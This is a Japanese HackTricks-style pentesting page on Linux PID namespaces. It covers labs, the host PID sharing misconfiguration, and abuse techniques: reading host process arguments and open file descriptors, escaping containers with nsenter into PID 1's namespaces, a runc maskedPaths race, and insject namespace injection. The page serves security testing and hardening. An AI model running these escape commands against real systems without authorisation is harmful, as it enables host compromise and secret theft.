# PID 名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概説

PID 名前空間はプロセスの番号付けと、どのプロセスが可視かを制御します。これが、コンテナが実機ではなくても独自の PID 1 を持てる理由です。名前空間の内部では、ワークロードはローカルのプロセスツリーのように見えるものを観測します。一方、名前空間の外側ではホストは実際のホスト PID と完全なプロセス状況を引き続き認識します。

セキュリティの観点では、プロセスの可視性は重要なので PID 名前空間は重要です。ワークロードがホストのプロセスを見られるようになると、サービス名、コマンドライン引数、プロセス引数に渡されたシークレット、`/proc` 経由の環境由来の状態、潜在的な名前空間侵入ターゲットなどを観測できる可能性があります。それらのプロセスを見るだけでなく、例えばシグナルを送る、あるいは条件が整えば ptrace を使うなどの行為が可能になれば、問題はさらに深刻になります。

## 動作

新しい PID 名前空間は独自の内部プロセス番号付けから始まります。名前空間内で最初に作成されたプロセスは名前空間側から見て PID 1 となり、これにより孤児プロセスの処理やシグナル動作に関して init に似た特別なセマンティクスを得ます。これが init プロセスやゾンビ再収集にまつわるコンテナの多くの挙動、そしてコンテナで小さな init ラッパーが使われる理由を説明します。

重要なセキュリティの教訓は、プロセスが自分自身の PID ツリーだけを見ているため分離されているように見えても、その分離は意図的に取り除くことができる、という点です。Docker はこれを `--pid=host` で、Kubernetes は `hostPID: true` で公開します。コンテナがホストの PID 名前空間に参加すると、ワークロードはホストのプロセスを直接見るようになり、その後の多くの攻撃経路がはるかに現実的になります。

## ラボ

PID 名前空間を手動で作成するには：
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
シェルは現在、プライベートなプロセスビューを見ています。`--mount-proc` フラグは重要で、これは新しい PID 名前空間に一致する procfs インスタンスをマウントし、内部から見たプロセス一覧の整合性を保ちます。

コンテナの挙動を比較するために：
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
違いは即座に分かりやすいため、読者にとって良い最初のラボになります。

## ランタイムでの利用

Docker、Podman、containerd、CRI-O の通常のコンテナはそれぞれ独自の PID namespace を持ちます。Kubernetes Pods も、ワークロードが明示的に host PID sharing を要求しない限り、通常は分離された PID の表示を受けます。LXC/Incus 環境も同じカーネルの基本機能に依存していますが、system-container のユースケースではより複雑なプロセスツリーが露出し、デバッグの近道を促すことがあります。

どこでも同じルールが適用されます: ランタイムが PID namespace を分離しないことを選んだ場合、それはコンテナ境界を意図的に縮小したことを意味します。

## 誤設定

典型的な誤設定は host PID sharing です。チームはデバッグ、モニタリング、サービス管理の便宜を理由に正当化することが多いですが、これは常に重要なセキュリティ例外として扱うべきです。たとえコンテナがホストプロセスに対して直ちに書き込み操作を行う権限を持たなくても、可視性だけでシステムについて多くのことが明らかになります。`CAP_SYS_PTRACE` のような capabilities や有用な procfs へのアクセスが追加されると、リスクは大幅に拡大します。

別の誤りは、ワークロードがデフォルトでホストプロセスを kill や ptrace できないからといって、host PID sharing は無害だと考えることです。その結論は、列挙の価値、namespace-entry の対象の存在、そして PID の可視性が他の緩められた制御と組み合わさる方法を無視しています。

## 悪用

host PID namespace が共有されている場合、攻撃者はホストプロセスを調査し、プロセス引数を収集し、興味深いサービスを特定し、`nsenter` の候補 PID を見つけたり、プロセスの可視性と ptrace 関連の権限を組み合わせてホストや隣接するワークロードに干渉したりする可能性があります。場合によっては、適切な長時間実行プロセスを単に見るだけで攻撃計画の残りを組み替えるのに十分なことがあります。

最初の実用的なステップは常に、ホストプロセスが実際に見えるかどうかを確認することです:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
一旦 host PIDs が見えるようになると、process arguments と namespace-entry targets がしばしば最も有用な情報源となる:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
もし `nsenter` が利用可能で、十分な権限がある場合、可視のホストプロセスが namespace bridge として使用できるかをテストする:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
エントリが遮断されていても、ホストPIDの共有は既に有用だ。サービスのレイアウト、ランタイムコンポーネント、そして次に標的とすべき権限を持つプロセスの候補を明らかにするからである。

ホストPIDの可視性は、file-descriptor abuse をより現実的にする。もし権限の高いホストプロセスや隣接するワークロードが機密性の高いファイルやソケットを開いている場合、攻撃者は所有権、procfs のマウントオプション、ターゲットサービスのモデルに応じて `/proc/<pid>/fd/` を検査し、そのハンドルを再利用できる可能性がある。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
これらのコマンドは、`hidepid=1` や `hidepid=2` がプロセス間の可視性を低減しているか、そして開かれているシークレットファイル、ログ、または Unix ソケットなどの明らかに興味深いディスクリプタがそもそも見えているかどうかを確認するのに有用です。

### 完全な例: host PID + `nsenter`

プロセスがホストの namespaces に参加するのに十分な権限を持っている場合、host PID の共有は直接的なホスト脱出になります:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
コマンドが成功すると、コンテナプロセスはホストの mount、UTS、network、IPC、および PID namespaces 内で実行されるようになります。影響はホストの即時侵害につながります。

`nsenter` 自体が存在しない場合でも、ホストのファイルシステムがマウントされていれば、ホストのバイナリを通じて同じ結果が得られる可能性があります:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 最近のランタイム注記

PID 名前空間に関連する攻撃の中には、従来の `hostPID: true` の設定ミスではなく、コンテナのセットアップ時に procfs 保護が適用される方法に起因するランタイム実装バグによるものがある。

#### `maskedPaths` によるホスト procfs への競合

脆弱な `runc` バージョンでは、コンテナイメージや `runc exec` のワークロードを制御できる攻撃者が、コンテナ側の `/dev/null` を `/proc/sys/kernel/core_pattern` のような機微な procfs パスへのシンボリックリンクに置き換えることでマスキング段階にレースを仕掛ける可能性がある。レースが成功すると、masked-path の bind mount が誤ったターゲットに適用され、ホスト全体の procfs 設定（knobs）が新しいコンテナに露出してしまう。

確認に便利なコマンド:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
これは重要です。最終的な影響は直接の procfs 露出と同様になり得ます：書き込み可能な `core_pattern` や `sysrq-trigger` を経て、ホストでのコード実行やサービス拒否につながる可能性があります。

#### Namespace injection with `insject`

`insject` のような Namespace injection ツールは、PID-namespace の相互作用が必ずしもプロセス作成前にターゲット namespace に事前に入ることを必要としないことを示しています。ヘルパーは後からアタッチし、`setns()` を使って、ターゲットの PID 空間への可視性を維持したまま実行できます：
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
この種の手法は、ランタイムが既にワークロードを初期化した後に namespace コンテキストに参加する必要があるような、高度なデバッグ、offensive tooling、post-exploitation ワークフローで主に重要です。

### 関連する FD の悪用パターン

host PIDs が見える場合、明確に指摘しておく価値のあるパターンが2つあります。まず、特権を持つプロセスは `execve()` を跨いで機密性の高いファイルディスクリプタを開いたままにすることがあり、これは `O_CLOEXEC` とマークされていなかったためです。次に、サービスが `SCM_RIGHTS` 経由で Unix ソケット上でファイルディスクリプタを渡すことがあります。いずれの場合も、興味深い対象はもはやパス名ではなく、低権限プロセスが継承または受け取る可能性のある既に開かれているハンドルです。

これは container 環境で重要です。なぜなら、ハンドルがパス自体が container filesystem から直接到達できない場合でも `docker.sock`、特権付きログ、host secret file、またはその他の高価値オブジェクトを指している可能性があるからです。

## チェック

これらのコマンドの目的は、プロセスが private PID ビューを持っているか、あるいは既により広範なプロセスの状況を列挙できるかを判断することです。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
ここでの注目点:

- プロセス一覧に明らかにホスト側のサービスが含まれている場合、ホストPID共有（host PID sharing）がすでに有効になっている可能性が高い。
- 小さなコンテナローカルのツリーしか見えないのが通常の基準であり、`systemd`、`dockerd`、または無関係なデーモンが見えるのは通常ではない。
- ホストのPIDが見えるようになると、読み取り専用のプロセス情報でさえ有用な偵察情報になる。

もしホストPID共有で動作しているコンテナを発見したら、それを表面的な違いとして扱ってはいけない。ワークロードが観察し、潜在的に影響を与え得る範囲が大きく変わっている。
{{#include ../../../../../banners/hacktricks-training.md}}
